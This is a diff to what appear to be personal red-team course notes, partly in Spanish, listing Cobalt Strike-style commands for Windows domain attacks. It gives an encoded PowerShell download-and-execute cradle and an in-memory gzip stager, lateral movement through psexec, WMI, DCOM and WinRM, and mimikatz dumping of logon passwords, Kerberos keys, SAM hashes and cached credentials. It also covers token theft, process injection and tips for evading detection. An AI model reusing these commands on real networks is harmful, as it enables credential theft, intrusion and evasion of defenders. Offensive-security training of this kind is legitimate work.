@@ -314,14 +314,77 @@ remote-exec
 execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Debug\Seatbelt.exe powershell -computername=srv-1
 powershell -nop -exec bypass -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAGMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAyADcALgAwAC4AMAAuADEAOgAyADEAMwAxADAALwAnACkA
 
-
 #PowerShell Remoting
 remote-exec winrm srv-1 (Get-WmiObject Win32_OperatingSystem).OSArchitecture
 
+#PsExec
+SCM copia un archivo y lo ejecuta atraves del SCM
+jump psexec64 srv-1 smb
+psexec_psh no copia un binario en el destino, sino que usa el SCM para ejecutar una línea única de PowerShell, y siempre será de 32 bits
+$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String("H4sIAA[...snip...]MLAAA="));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();
 
+#WMI
+Evento WmiPrvSE
+uplaod smb.exe
+remote-exec wmi srv-1 smb.exe
+link srv-1
+ojo cuando se utiliza una vez la siguiente mejor utilizar
+#CoInitializeSecurity
+execute-assembly C:\Tools\SharpWMI\SharpWMI\bin\Debug\SharpWMI.exe action=exec computername=srv-2 command="C:\Windows\System32\calc.exe"
 
-netlogons
+#DCOM
+powershell-import C:\Tools\Invoke-DCOM.ps1
+powershell Invoke-DCOM -ComputerName srv-1 -Method MMC20.Application -Command C:\Windows\beacon-smb.exe "dificil de detecta ya que genera un hijo system32/mmc.exe
+link srv-1
+
+#IMPERSONATION
+net logons usuarios conectados
 ps
 
+#LOGONPASSWORDS
+Deshabilitando wdigest para evitar tokens
 mimikatz sekurlsa::logonpasswords
 mimikatz sekurlsa::ekeys
+
+#OPSEC-5 una gran cantidad de técnicas comerciales que aprovechan NTLM no son deseables.Recomendado usar SHA256
+
+mimikatz sekurlsa::ekeys  ((descarga aes256)) vuelva las claves de cifrado de Kerberos.
+tomar los campos aes256_hmac y aes128_hmac para overpass the hash
+
+#Security Account Manager extraer los hash NTLM --base de datos del administrador de cuentas--
+mimikatz lsadump::sam
+
+#Domain Cachec Credentials
+Las credenciales en caché de dominio se diseñaron para instancias en las que se requieren credenciales de dominio para iniciar sesión en una máquina.
+mimikatz lsadump::cache
+hay que romperalas porque el formato no es NTLM
+$DCC2$<iterations>#<username>#<hash>
+
+#Make Token no requiere ser administrador local
+make_token ACC\Users password
+rev2self
+
+#OPSEC
+4624: An account was successfully logged on
+source = "WinEventLog: Security" EventCode = 4624 Logon_Type = 9
+
+#Process Injection
+ps
+inject 3320 x64 tcp-4444-local
+
+#Token Impersonation
+ps
+steal_token 3320 proceso
+rev2self
+
+
+
+
+
+
+
+
+
+
+
+
